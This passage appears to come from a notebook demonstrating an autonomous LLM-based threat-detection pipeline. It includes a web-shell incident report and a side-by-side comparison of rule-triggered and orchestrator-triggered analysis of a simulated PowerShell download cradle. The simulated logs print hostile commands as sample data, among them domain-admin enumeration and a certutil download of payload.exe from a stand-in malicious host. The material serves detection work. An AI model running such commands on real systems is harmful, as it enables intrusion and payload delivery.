# - Use network topology from `ipconfig` to **map pivot paths** to domain controllers
# - Leverage the compromised IIS service account or harvested credentials for **lateral movement** toward a Domain Controller
# - Achieve **Domain Admin** privilege → full domain takeover, ransomware deployment, data exfiltration, or persistent backdoor installation
#
# The IIS worker process (`DefaultAppPool`) likely runs as `NETWORK SERVICE` or a dedicated service account, which may itself have elevated privileges exploitable for escalation.
#
# ---
#
# ## 4. MITRE ATT&CK Techniques
#
# | ID | Name | Tactic | Evidence in This Sequence |
# |---|---|---|---|
# | **T1505.003** | Server Software Component: Web Shell | **Persistence** | `w3wp.exe` spawning `cmd.exe` children — web shell planted on IIS server as persistent access mechanism |
# | **T1033** | System Owner/User Discovery | **Discovery** | `cmd.exe /c whoami` (pid 6543) — confirms execution identity post-compromise |
# | **T1087** | Account Discovery | **Discovery** | `cmd.exe /c net user` (pid 6544) + `cmd.exe /c net group "Domain Admins" /domain` (pid 6546) — local and domain account enumeration |
# | **T1016** | System Network Configuration Discovery | **Discovery** | `cmd.exe /c ipconfig /all` (pid 6545) — network topology and domain membership mapping |
#
# ---
#
# ## 5. Confidence Assessment
#
# ### **Confidence Level: CRITICAL — 0.95**
#
# **Reasons for near-certainty:**
#
# - ✅ **Zero legitimate explanation** for `w3wp.exe → cmd.exe` in a production IIS environment. This parent-child relationship is a hard behavioral IOC.
# - ✅ **Sequential recon commands** perfectly match documented post-web-shell exploitation playbooks (matching reference pattern verbatim).
# - ✅ **Domain Admins enumeration** removes any ambiguity about attacker intent — this is not accidental or benign.
# - ✅ **Pattern corroborated by tool consensus**: `format_process_tree`, `identify_attack_patterns`, and `lookup_mitre_technique` all independently confirm the same pattern.
#
# ### ⚠️ RECURRING THREAT — PATTERN SEEN BEFORE
#
# `get_similar_threats` returned **3 prior detections** of this exact pattern, all rated **CRITICAL (0.95 confidence)**:
#
# | Prior Detection | Timestamp | Techniques Matched |
# |---|---|---|
# | Web Shell Activity #1 | 2026-05-25 09:32:19 | T1505.003, T1033, T1087 |
# | Web Shell Activity #2 | 2026-05-25 09:33:43 | T1505.003, T1033, T1087 |
# | Web Shell Activity #3 | 2026-05-26 09:00:23 | T1505.003, T1033, T1087 |
#
# **This is not an isolated incident.** The recurrence of this pattern across **two separate dates** strongly suggests either:
# 1. **Persistence is established and unresolved** — the web shell was not removed after prior detections, and the attacker has returned.
# 2. **Multiple actors** are exploiting the same unpatched IIS vulnerability.
#
# > 🚨 **The prior detections make this significantly more dangerous.** If this IIS vulnerability or web shell was identified in prior runs and not remediated, the attacker may now have had extended dwell time and could have already progressed beyond the Discovery phase captured here.
#
# ---
#
# ## Immediate Recommended Actions
#
# 1. **Isolate** the IIS server from the network immediately to prevent lateral movement
# 2. **Identify the web shell file** — review IIS logs for POST requests to `.aspx`/`.php` files not in normal app inventory, especially in `wwwroot` or `upload` directories
# 3. **Audit the `DefaultAppPool` service account** for signs of credential abuse or privilege escalation
# 4. **Cross-reference prior detections** (2026-05-25, 2026-05-26) — determine if the same server was involved and whether remediation was completed
# 5. **Hunt laterally** for signs of pivoting from this host toward Domain Controllers (authentication logs, SMB/RPC connections)
#
# RECOMMENDED ACTIONS
# -------------------
# 1. Immediately isolate the affected IIS server from the network to halt lateral movement and cut off the attacker's web shell command channel.
# 2. Identify and remove the web shell file by auditing IIS logs for anomalous POST requests to .aspx/.php files in wwwroot or upload directories not present in the authorized application inventory.
# 3. Audit and reset credentials for the DefaultAppPool service account and any other accounts discoverable from the compromised host, checking authentication logs for signs of credential abuse or privilege escalation.
# 4. Correlate with prior detections from 2026-05-25 and 2026-05-26 to determine if the same server was involved, assess attacker dwell time, and confirm whether prior remediation was actually completed.
# 5. Initiate a lateral movement hunt targeting Domain Controllers by reviewing SMB, RPC, WinRM, and Kerberos authentication logs originating from the compromised IIS server, and deploy enhanced monitoring on all Domain Admin accounts identified as enumeration targets.

# %% [markdown]
# ---
# ## 9. Side-by-side: Category 3 vs Category 4
#
# Run the same scenario through both modes. The pipeline output (analysis,
# classification, recommended actions) is identical in both cases.
# The only difference is the initiation trail — who or what decided to investigate.
#
# > **LLM calls:** two full pipeline runs. Expect 4–8 minutes.

# %%
from cyber_ignition_agents.sensor.monitor import watch_simulated, watch_with_orchestrator

COMPARE_EVENTS = events_a
COMPARE_NAME   = name_a
SID = datetime.now().strftime("%Y%m%d_%H%M%S")

# Category 3 run
report_cat3 = None
def _on_cat3(snapshot: dict, all_events: list):
    global report_cat3
    report_cat3 = run_scenario(COMPARE_NAME, snapshot, all_events,
                               session_id=SID + "_cat3")

print("Running Category 3 (rules)...")
watch_simulated(COMPARE_NAME, COMPARE_EVENTS, _on_cat3, delay=0.0)

# Category 4 run
report_cat4 = None
def _on_cat4(snapshot: dict, all_events: list, orchestrator_reasoning: str = ""):
    global report_cat4
    report_cat4 = run_scenario(COMPARE_NAME, snapshot, all_events,
                               session_id=SID + "_cat4",
                               orchestrator_reasoning=orchestrator_reasoning)

print("Running Category 4 (orchestrator)...")
watch_with_orchestrator(COMPARE_NAME, COMPARE_EVENTS, _on_cat4, delay=0.0)
# Out:
# Running Category 3 (rules)...
# [sensor] Simulated feed: PowerShell Download Cradle
# [sensor] Watching 5 events...
#
#   [09:13:26] explorer.exe (pid 1234)  ←  —
#   [09:13:27] cmd.exe (pid 5432)  ←  explorer.exe
#   [09:13:28] powershell.exe (pid 6789)  ←  cmd.exe
#
# [sensor] *** TRIGGER: powershell.exe (pid 6789) matched a signature ***
# [sensor] Running LLM triage...
# [sensor] [TRIAGE] FIRE — Encoded PowerShell command from cmd.exe spawning certutil for remote payload download indicates a classic multi-stage malware execution chain with obfuscation and file download indicators.
# [sensor] Environment signal confirmed — initiating pipeline...
#
#   [1/5] trigger_received  — powershell.exe (pid 6789) <- cmd.exe
#   [2/5] monitor_activity  — 5 events collected
#   [3/5] analyze_sequence  — invoking ReAct agent...
#   [Anthropic API call] model=claude-sonnet-4-6  messages=2  ts=09:17:21
#   [Anthropic API call] model=claude-sonnet-4-6  messages=4  ts=09:17:27
#   [Anthropic API call] model=claude-sonnet-4-6  messages=7  ts=09:17:32
#   [Anthropic API call] model=claude-sonnet-4-6  messages=11  ts=09:17:36
#   [4/5] classify_threat   — calling LLM...
#   [Anthropic API call] model=claude-sonnet-4-6  node=classify_threat  ts=09:18:25
#   [5/5] generate_report   — formatting output
# Running Category 4 (orchestrator)...
# [orchestrator] Adaptive sensing: PowerShell Download Cradle
# [orchestrator] No pre-specified rules — reasoning from general knowledge
#
#   [09:13:26] explorer.exe (pid 1234)  ←  —
#   [09:13:27] cmd.exe (pid 5432)  ←  explorer.exe
#   [09:13:28] powershell.exe (pid 6789)  ←  cmd.exe
#   [09:13:30] certutil.exe (pid 7890)  ←  powershell.exe
#   [09:13:32] certutil.exe (pid 7890)  —  Outbound TCP connection to 203.0.113.99:80 (malicious.example.com)
#
# [orchestrator] *** INVESTIGATE ***
# [orchestrator] This chain exhibits multiple indicators of malicious activity. The progression from explorer.exe → cmd.exe → powershell.exe with encoded commands followed by certutil.exe downloading an executable from a remote host matches known attack patterns (Living off the Land Binaries abuse, encoded command execution, and file staging). The use of certutil for file download is a classic technique to evade detection, and the target path (C:\Users\Public\) is a common staging location for lateral movement or privilege escalation payloads.
# [orchestrator] Initiating analysis pipeline...
#
#   [1/5] trigger_received  — certutil.exe (pid 7890) <- powershell.exe
#   [2/5] monitor_activity  — 5 events collected
#   [3/5] analyze_sequence  — invoking ReAct agent...
#   [Anthropic API call] model=claude-sonnet-4-6  messages=2  ts=09:18:39
#   [Anthropic API call] model=claude-sonnet-4-6  messages=6  ts=09:18:48
#   [Anthropic API call] model=claude-sonnet-4-6  messages=10  ts=09:18:51
#   [4/5] classify_threat   — calling LLM...
#   [Anthropic API call] model=claude-sonnet-4-6  node=classify_threat  ts=09:19:40
#   [5/5] generate_report   — formatting output
# True

# %%
# Show the first 25 lines of each report — the initiation headers differ;
# the PROCESS SEQUENCE / THREAT CLASSIFICATION / ANALYSIS sections are the same
def head(report, n=25):
    return "\n".join((report or "(no report)").splitlines()[:n])

print("=" * 62)
print("CATEGORY 3  —  initiated by rule match")
print("=" * 62)
print(head(report_cat3))

print()
print("=" * 62)
print("CATEGORY 4  —  initiated by autonomous orchestrator reasoning")
print("=" * 62)
print(head(report_cat4))
# Out:
# ==============================================================
# CATEGORY 3  —  initiated by rule match
# ==============================================================
# CYBER-SENSE THREAT REPORT
# ==========================
# Timestamp: 2026-05-26 09:18:34
# Trigger:   powershell.exe spawned from cmd.exe
#
# Initiated by: environment signal (process monitor)
# Human involvement: none at detection or analysis stage
#
# PROCESS SEQUENCE
# ----------------
# [09:13:26] explorer.exe (pid 1234) spawned by — (pid —)
# [09:13:27] cmd.exe (pid 5432) spawned by explorer.exe (pid 1234)
#            cmdline: cmd.exe /c
# [09:13:28] powershell.exe (pid 6789) spawned by cmd.exe (pid 5432)
#            cmdline: powershell.exe -EncodedCommand JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQA...
# [09:13:30] certutil.exe (pid 7890) spawned by powershell.exe (pid 6789)
#            cmdline: certutil.exe -urlcache -f http://malicious.example.com/payload.exe C:\Users\Public\payload.exe
# [09:13:32] certutil.exe (pid 7890) — Outbound TCP connection to 203.0.113.99:80 (malicious.example.com)
#
# THREAT CLASSIFICATION
# ---------------------
# Level:      CRITICAL
# Confidence: 0.97
# Technique:  T1059.001 - Command and Scripting Interpreter: PowerShell
#             T1027 - Obfuscated Files or Information
#
# ==============================================================
# CATEGORY 4  —  initiated by autonomous orchestrator reasoning
# ==============================================================
# CYBER-SENSE THREAT REPORT
# ==========================
# Timestamp: 2026-05-26 09:19:48
# Trigger:   certutil.exe spawned from powershell.exe
#
# ORCHESTRATOR DECISION
# ---------------------
# Decision:   INVESTIGATE
# Reasoning:  This chain exhibits multiple indicators of malicious activity. The progression from explorer.exe → cmd.exe → powershell.exe with encoded commands followed by certutil.exe downloading an executable from a remote host matches known attack patterns (Living off the Land Binaries abuse, encoded command execution, and file staging). The use of certutil for file download is a classic technique to evade detection, and the target path (C:\Users\Public\) is a common staging location for lateral movement or privilege escalation payloads.
#
# Initiated by: autonomous orchestrator reasoning (no pre-specified rules)
# Human involvement: none at initiation, analysis, or detection stage
#
# PROCESS SEQUENCE
# ----------------
# [09:13:26] explorer.exe (pid 1234) spawned by — (pid —)
# [09:13:27] cmd.exe (pid 5432) spawned by explorer.exe (pid 1234)
#            cmdline: cmd.exe /c
# [09:13:28] powershell.exe (pid 6789) spawned by cmd.exe (pid 5432)
#            cmdline: powershell.exe -EncodedCommand JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQA...
# [09:13:30] certutil.exe (pid 7890) spawned by powershell.exe (pid 6789)
#            cmdline: certutil.exe -urlcache -f http://malicious.example.com/payload.exe C:\Users\Public\payload.exe
# [09:13:32] certutil.exe (pid 7890) — Outbound TCP connection to 203.0.113.99:80 (malicious.example.com)
#
# THREAT CLASSIFICATION

# %%
# The architectural claim in one print statement
if report_cat3 and report_cat4:
    lines3 = report_cat3.splitlines()
    lines4 = report_cat4.splitlines()
    # Find the initiation lines
    for line in lines3:
        if "Initiated by" in line or "Human involvement" in line:
            print(f"Cat 3: {line.strip()}")
    for line in lines4:
        if "Initiated by" in line or "Human involvement" in line or "ORCHESTRATOR" in line:
            print(f"Cat 4: {line.strip()}")
# Out:
# Cat 3: Initiated by: environment signal (process monitor)
# Cat 3: Human involvement: none at detection or analysis stage
# Cat 4: ORCHESTRATOR DECISION
# Cat 4: Initiated by: autonomous orchestrator reasoning (no pre-specified rules)
# Cat 4: Human involvement: none at initiation, analysis, or detection stage
